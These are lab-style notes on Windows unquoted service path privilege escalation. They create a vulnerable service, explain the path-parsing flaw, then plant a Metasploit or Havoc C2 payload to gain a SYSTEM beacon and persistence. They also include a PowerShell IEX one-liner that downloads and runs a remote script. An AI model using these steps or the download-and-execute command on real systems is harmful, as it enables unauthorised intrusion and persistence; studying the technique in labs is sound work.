# UNQUOTED SERVICE PATH

- AlwaysInstallElevated (MSI)
  
- Unquoted Service Path (Services)
  - Requires missing "quotes"
  - and whitespaces in the path
  - write permission in the (sub)folder that holds the service binary

To exploit, the exe needs to be named after the directory it's in, i.e:

---  

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

- Create folders "C:\MyPrograms\Vulnerable Service\"
- create pingservice in vs2019
- copy pingservice as "VulnService.exe" to this path

```powershell
sc create VulnService binPath= "C:\MyPrograms\Vulnerable Service\VulnService.exe"
sc qc VulnService
sc start VulnService
```

When there are spaces in a service path, windows will try to find the service as follows:

It will parse "C:\MyPrograms\Vulnerable Service\service.exe" into

- Potential service : "C:\MyPrograms\vulnerable.exe"
- with arguments `Service\service.exe`

By placing a malicious service exe in "C:\MyPrograms\" named `vulnerable.exe`, we'll escalate privileges to NT SYSTEM AUHTORITY (if the service is running with those privileges)



Then drop metasploit payload (renamed to Vulnerable.exe) in C:\MyPrograms.

  https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md

---

Run the following tools as a regular unprivileged user (`runas /user:student powershell.exe`)

> - [+] SharpUp/Powerup
> - [+] WinPeas

### WINPEAS

Runas student (unprivileged)

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```



Use the Havoc session to upload a havoc.exe renamed to `vulnerable.exe` to the `C:\MyPrograms\Vulnerable Service\` path, and then start the VulnService, using the havoc `shell` command.

upload /opt/havoc/demonsvc.x64.exe c:\MyPrograms\Vulnerable.exe

```powershell
sc.exe start VulnService
```

> Please note that regular users can't restart services, but after a reboot this will automatically execute.

You'll now have a 2nd beacon with `NT AUHORITY\SYSTEM` privileges.


> ***IMPORTANT***: We achieve not only `Privilege Escalation`, but also `code-execution` and `persistence`!!!